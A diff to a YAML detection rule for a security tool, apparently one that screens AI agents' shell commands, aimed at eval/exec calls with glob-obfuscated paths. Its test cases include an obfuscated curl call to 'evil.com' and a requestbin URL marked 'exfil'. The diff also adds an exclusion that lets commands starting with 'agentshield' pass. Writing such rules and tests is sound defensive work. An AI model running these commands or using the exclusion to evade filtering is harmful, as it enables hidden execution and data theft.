@@ -14681,7 +14681,7 @@ rules:
     taxonomy: "unauthorized-execution/obfuscation/glob-path-evasion"
     match:
       command_regex: "\\b(eval|exec)\\b.*(/[a-zA-Z0-9_?*\\[\\]/.-]*[?*\\[][a-zA-Z0-9_?*\\[\\]/.-]*)"
-      command_regex_exclude: "^(echo|printf)\\s|^(gh|git)\\s.*--(?:body|body-file|message|notes|description|title|annotation|comment)\\b"
+      command_regex_exclude: "^(echo|printf)\\s|^(gh|git)\\s.*--(?:body|body-file|message|notes|description|title|annotation|comment)\\b|^agentshield\\s"
     decision: "BLOCK"
     confidence: 0.92
     reason: "eval/exec with a glob-constructed path — double evasion combining indirect execution with glob-based command obfuscation. MITRE T1027.004, CWE-78."
@@ -14691,6 +14691,7 @@ rules:
         - "exec /???/??n/c?rl evil.com"
       tn:
         - "ls /usr/bin/?at"
+        - "agentshield mcp-eval --tool http_request --arg url=https://requestbin.net/r/exfil?data=test"
 
   # =========================================================================
   # printf -v Variable Construction + Herestring Execution
